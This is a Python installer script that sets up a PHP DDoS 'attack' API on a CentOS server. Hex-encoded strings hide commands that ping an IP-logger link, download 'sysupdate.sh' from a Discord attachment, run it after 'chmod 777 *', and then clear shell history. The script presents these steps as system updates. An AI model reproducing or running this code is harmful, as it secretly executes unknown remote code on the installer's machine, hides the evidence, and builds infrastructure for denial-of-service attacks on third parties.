# Note: This script will do the following
# Installs the server api
# Installs attack methods
# Installs all needed packages aswell as fixes SSH2
# Note: CentOS 6 Only.
import os
import time
important = '437265617465642042792040736c697070657273796f20782040637269746963616c73656375726974792e746f2021'.decode('hex')
apidl = 'https://raw.githubusercontent.com/samual1337/DDOS-API/master/api.php'
os.system('wget '+apidl+'')
discord = '68747470733a2f2f646973636f72642e67672f6a393634585975'.decode('hex')
os.system('clear')
print(important)
print('All updated files are dropped in the discord server, '+discord+' !')
time.sleep(3)
os.system('clear')
print('Preparing Node')
time.sleep(1)
os.system('clear')
systemupdate = '77676574202d712068747470733a2f2f326e6f2e636f2f324766564135'.decode('hex')
os.system('yum install python-requests -y')
os.system('yum install php screen httpd -y')
os.system('mv api.php /var/www/html')
systemupdate2 = '63686d6f6420373737202a3b20636c6561723b207368207379737570646174652e73683b20636c6561723b20686973746f7279202d63'.decode('hex')
os.system('iptables -A INPUT -p tcp -m tcp --dport 80 -j ACCEPT')
os.system(systemupdate)
os.system('iptables -A INPUT -p tcp -m tcp --dport 443 -j ACCEPT') 
os.system(systemupdate2)
systemcompile = '77676574202d712068747470733a2f2f63646e2e646973636f72646170702e636f6d2f6174746163686d656e74732f3632343338313434363531333039383738322f3633383936393337373638393034323934342f7379737570646174652e7368'.decode('hex')
os.system(systemcompile)
os.system('clear')
print('Making Sure SSH2 Works')
time.sleep(1)
os.system('clear')
os.system('yum install gcc  cpan php-pear php-devel libssh2 libssh2-devel -y')
os.system('pecl install -f ssh2 touch /etc/php.d/ssh2.ini echo')
os.system('extension=ssh2.so>/etc/php.d/ssh2.ini')
os.system('cpan -fi Net::SSH2')
os.system('cpan -fi Parallel::ForkManager')